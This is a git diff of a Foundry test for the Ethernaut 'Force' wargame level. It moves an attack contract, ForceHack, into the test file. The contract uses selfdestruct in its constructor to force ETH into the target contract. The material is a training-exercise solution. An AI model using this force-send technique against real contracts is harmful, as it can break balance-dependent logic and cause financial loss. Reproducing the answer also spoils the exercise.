@@ -4,7 +4,6 @@ pragma solidity ^0.8.14;
 import "forge-std/Test.sol";
 import "forge-std/console.sol";
 import "../src/Force/ForceFactory.sol";
-import "../src/Force/ForceHack.sol";
 import "../src/Ethernaut.sol";
 
 // forge test --match-contract ForceTest -vvvv
@@ -43,5 +42,14 @@ contract ForceTest is Test {
         );
         vm.stopPrank();
         assert(levelSuccessfullyPassed);
+    }
+}
+
+contract ForceHack {
+    constructor(address payable attacker) payable {
+        // very easy here, we just need to call selfdestruct
+        // we can do it directly in the constructor
+        require(msg.value > 0); // require a bit of ETH to be sent otherwise the base contract doesn't have funds
+        selfdestruct(attacker);
     }
 }
